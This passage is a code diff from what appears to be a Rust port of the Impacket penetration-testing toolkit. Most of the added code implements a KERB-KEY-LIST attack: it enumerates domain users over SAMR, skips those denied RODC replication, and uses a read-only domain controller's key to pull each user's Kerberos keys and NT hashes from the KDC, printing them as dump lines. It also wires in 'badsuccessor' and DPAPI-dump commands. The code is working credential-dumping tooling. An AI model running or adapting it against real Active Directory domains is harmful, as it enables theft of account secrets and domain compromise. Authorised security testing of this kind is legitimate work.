+                    if let Some((user, rid_str)) = line.split_once(':') {
+                        targets.push((user.to_string(), rid_str.parse().ok()));
+                    } else {
+                        targets.push((line.to_string(), None));
+                    }
+                }
+            }
+            Err(e) => {
+                eprintln!("[-] Failed reading target file '{}': {}", file_path, e);
+                std::process::exit(1);
+            }
+        }
+    } else if let Some(ref spec) = spec_opt {
+        // Enumerate users via SAMR on DC
+        println!("[*] Connecting to SAMR on {} to enumerate allowed replication targets...", spec.effective_target_ip());
+        let samr_enum_res = (|| -> Result<Vec<(String, Option<u32>)>, CoreError> {
+            let transport = open_pipe_transport(spec, "samr", IFACE_SAMR)?;
+            let mut client = SamrClient::new(transport);
+            let server_name = format!(r"\\{}", spec.effective_target_ip());
+            let server_handle = client.connect5(&server_name, 0x0000_0230)?;
+
+            let (_, dom_sid) = if let Some(ref d_sid_str) = domain_sid {
+                let parsed_sid = impacket_ndr::RpcSid::parse(d_sid_str)?;
+                (domain.clone(), parsed_sid)
+            } else {
+                let sid = client.lookup_domain(&server_handle, &domain)?;
+                (domain.clone(), sid)
+            };
+
+            domain_sid = Some(dom_sid.to_string());
+            let domain_handle = client.open_domain(&server_handle, 0x0000_0300, &dom_sid)?;
+
+            // RID 572: Denied RODC Password Replication Group
+            let mut denied_rids = vec![500, 501, 502, 503];
+            if let Ok(alias_h) = client.open_alias(&domain_handle, 0x0002_0004, 572) {
+                if let Ok(members) = client.get_members_in_alias(&alias_h) {
+                    for sid in members {
+                        if let Some(&last_sub) = sid.sub_authorities.last() {
+                            if !denied_rids.contains(&last_sub) {
+                                denied_rids.push(last_sub);
+                            }
+                        }
+                    }
+                }
+                client.close_handle(&alias_h).ok();
+            }
+
+            let all_users = client.enumerate_users(&domain_handle, 0)?;
+            let mut allowed = Vec::new();
+            for u in all_users {
+                if !denied_rids.contains(&u.relative_id) && !u.name.starts_with("krbtgt_") {
+                    allowed.push((u.name, Some(u.relative_id)));
+                }
+            }
+            Ok(allowed)
+        })();
+
+        match samr_enum_res {
+            Ok(found) => {
+                println!("[*] Found {} domain user(s) allowed for RODC replication.", found.len());
+                targets = found;
+            }
+            Err(e) => {
+                eprintln!("[-] SAMR user enumeration failed: {}. Specify targets manually with -t or -tf", e);
+                std::process::exit(1);
+            }
+        }
+    } else {
+        eprintln!("[-] No target users specified. Provide target credentials for SAMR enum, or specify -t <USER> / -tf <FILE>");
+        std::process::exit(1);
+    }
+
+    if targets.is_empty() {
+        println!("[-] No users to attack.");
+        return;
+    }
+
+    println!("[*] Executing KERB-KEY-LIST attack against KDC {} for {} target(s)...", kdc_host, targets.len());
+
+    let now_unix = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap()
+        .as_secs() as i64;
+
+    for (user, rid_opt) in &targets {
+        let res = dump_user_keylist_live(
+            &kdc_host,
+            88,
+            &domain,
+            user,
+            *rid_opt,
+            domain_sid.as_deref(),
+            rodc_no,
+            &rodc_key,
+            etype,
+            &[23, 18, 17],
+            now_unix,
+            Duration::from_secs(10),
+        );
+
+        match res {
+            Ok(keys) => {
+                let rid_str = rid_opt.map(|r| r.to_string()).unwrap_or_else(|| "1000".into());
+                if let Some(nthash) = find_nthash(&keys) {
+                    println!(
+                        "{}\\{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
+                        domain.to_uppercase(),
+                        user,
+                        rid_str,
+                        nthash
+                    );
+                } else {
+                    println!("[+] {}\\{} (RID {}): dumped {} keys", domain.to_uppercase(), user, rid_str, keys.len());
+                }
+                if full_output {
+                    for (ktype, kval) in &keys {
+                        println!("    etype {:<3} : {}", ktype, impacket_core::encode_hex(kval));
+                    }
+                }
+            }
+            Err(e) => {
+                let err_str = e.to_string();
+                if err_str.contains("0x12") || err_str.contains("KDC_ERR_CLIENT_REVOKED") || err_str.contains("KDC_ERR_TGT_REVOKED") {
+                    eprintln!("[-] User {} is not allowed to have passwords replicated to RODCs", user);
+                } else if err_str.contains("0x6") || err_str.contains("KDC_ERR_C_PRINCIPAL_UNKNOWN") {
+                    eprintln!("[-] User {} doesn't exist", user);
+                } else {
+                    eprintln!("[-] {}\\{}: {}", domain, user, e);
+                }
+            }
+        }
+    }
 }
 
 fn cmd_dacledit(args: &[String]) {
@@ -13679,6 +14589,7 @@ fn main() {
             cmd_check_ldap_status(&args[1..])
         }
         Some("addcomputer") | Some("add-computer") => cmd_addcomputer(&args[1..]),
+        Some("badsuccessor") | Some("bad-successor") | Some("dmsa") => cmd_badsuccessor(&args[1..]),
         Some("dacledit") | Some("dacl-edit") => cmd_dacledit(&args[1..]),
         Some("owneredit") | Some("owner-edit") => cmd_owneredit(&args[1..]),
         Some("dnstool") | Some("dns-tool") => cmd_dnstool(&args[1..]),
@@ -13746,6 +14657,7 @@ fn main() {
         Some("ntdsdump") | Some("ntds-dump") => cmd_ntdsdump(&args[1..]),
         Some("esentutl") => cmd_esentutl(&args[1..]),
         Some("dpapi") => cmd_dpapi(&args[1..]),
+        Some("dpapidump") | Some("dpapi-dump") => cmd_dpapidump(&args[1..]),
         Some("backupkey") | Some("backupkeys") | Some("bkrp") => cmd_backupkey(&args[1..]),
         Some("Get-GPPPassword")
         | Some("get-gpppassword")
@@ -13788,6 +14700,10 @@ fn main() {
         Some("smb-negotiate") => cmd_smb_negotiate(&args[1..]),
         Some("rpc-interfaces") => cmd_rpc_interfaces(),
         Some("bench-ndr") => cmd_bench_ndr(&args[1..]),
+        Some("completions") | Some("completion") => cmd_completions(&args[1..]),
+        Some("keylistattack") | Some("keylistdump") | Some("keylist") => {
+            cmd_keylistattack(&args[1..])
+        }
         _ => print_usage(),
     }
 }
@@ -13912,6 +14828,8 @@ mod tests {
                 KerberosEType::Rc4Hmac,
                 KerberosEType::Aes256CtsHmacSha1_96,
                 KerberosEType::Aes128CtsHmacSha1_96,
+                KerberosEType::Aes256CtsHmacSha384_192,
+                KerberosEType::Aes128CtsHmacSha256_128,
             ]
         );
 
@@ -13921,5 +14839,29 @@ mod tests {
             "invalid".to_string(),
         ];
         assert!(parse_get_user_spns_options(&args_bad).is_err());
+    }
+
+    #[test]
+    fn test_shell_completions_generation() {
+        let bash = completions::generate_bash();
+        assert!(bash.contains("_impacket_rs_complete"));
+        assert!(bash.contains("complete -F _impacket_rs_complete impacket-rs"));
+        assert!(bash.contains("bloodhound"));
+        assert!(bash.contains("secretsdump"));
+        assert!(bash.contains("coerce"));
+
+        let zsh = completions::generate_zsh();
+        assert!(zsh.contains("#compdef impacket-rs impacket"));
+        assert!(zsh.contains("_impacket_rs"));
+        assert!(zsh.contains("bloodhound"));
+
+        let fish = completions::generate_fish();
+        assert!(fish.contains("complete -c impacket-rs"));
+        assert!(fish.contains("complete -c impacket"));
+        assert!(fish.contains("__fish_impacket_rs_no_subcommand"));
+
+        let pwsh = completions::generate_powershell();
+        assert!(pwsh.contains("Register-ArgumentCompleter"));
+        assert!(pwsh.contains("impacket-rs"));
     }
 }
